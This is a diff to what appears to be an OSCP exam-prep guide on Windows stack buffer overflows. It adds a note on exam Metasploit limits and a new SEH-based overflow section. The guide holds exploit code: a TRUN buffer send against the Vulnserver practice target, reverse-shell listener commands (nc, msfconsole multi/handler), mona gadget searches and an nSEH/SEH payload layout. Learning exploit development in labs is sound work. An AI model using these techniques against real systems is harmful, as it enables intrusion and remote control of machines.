@@ -85,7 +85,40 @@ s.connect((ip, port))
 s.send(b"TRUN /.:/" + buffer)
 s.close()
 ```
-Set up a listener before firing: `nc -lvnp 4444` or `msfconsole -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST ...; run"`.
+Set up a listener before firing: `nc -lvnp 4444`.
+
+> **Exam note:** on the real OSCP exam, Metasploit/Meterpreter (including `multi/handler`) may be used against only **one** non-AD machine for the entire exam, and never to pivot. `msfconsole -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST ...; run"` is a valid alternative listener, but treat it as reference-only for that single permitted target — standardize on plain `nc -lvnp` for every other box, including all community practice targets in this doc.
+
+---
+
+## SEH-Based Overflow (when EIP isn't directly overwritten)
+
+Some targets overwrite the SEH chain on crash instead of the saved return address directly (check Immunity's SEH pane / "SEH chain" — if it's corrupted with your pattern bytes instead of EIP, use this path).
+
+### 1. Confirm SEH overwrite
+Send the cyclic pattern as in step 2 above. If EIP is untouched but the SEH record is overwritten with pattern bytes, find both offsets:
+```bash
+msf-pattern_offset -q <nSEH_value> -l 3000   # offset to nSEH (4 bytes)
+# SEH offset = nSEH offset + 4
+```
+
+### 2. Find a POP POP RET gadget (no SafeSEH module)
+```
+!mona modules            # find a module with SafeSEH = False
+!mona seh                # lists POP POP RET gadgets across all non-SafeSEH modules
+```
+Pick an address with no bad chars, little-endian encode it (e.g. `625016F1` → `\xF1\x16\x50\x62`).
+
+### 3. Build the buffer
+Layout: `junk (offset) + nSEH (short jump) + SEH (POP POP RET addr) + shellcode`
+```python
+nseh = b"\xeb\x06\x90\x90"   # short jump 6 bytes forward, over the SEH field
+seh  = b"\xF1\x16\x50\x62"   # POP POP RET address, little-endian
+buffer = b"A" * offset + nseh + seh + b"\x90" * 16 + shellcode
+```
+On exception, the POP POP RET pops the two stack values pushed by the SEH dispatch, then RETs into `nseh`, which short-jumps past the 4-byte SEH field into the NOP sled/shellcode.
+
+**Reference:** https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial/ (SEH section) · `!mona seh` docs: https://github.com/corelan/mona
 
 ---
 
